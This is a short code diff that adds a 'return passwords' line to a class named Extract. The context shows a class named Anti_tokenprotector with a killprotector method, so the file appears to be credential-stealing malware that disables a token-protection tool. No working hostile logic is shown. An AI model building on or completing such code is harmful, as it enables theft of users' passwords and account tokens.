@@ -78,6 +78,8 @@ class Extract:
         try: os.remove(tempfile) 
         except: pass
 
+        return passwords
+
 
 class Anti_tokenprotector:
     def killprotector():
